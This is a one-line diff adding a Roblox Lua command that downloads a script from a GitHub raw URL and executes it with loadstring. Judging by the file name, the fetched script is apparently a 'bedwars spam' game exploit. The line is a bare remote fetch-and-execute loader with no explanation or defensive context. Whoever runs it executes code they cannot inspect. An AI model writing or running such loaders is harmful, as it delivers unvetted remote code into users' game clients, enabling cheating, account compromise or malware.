@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/part-2-bedwars-spam6-6bray9feobu83i.lua"))()
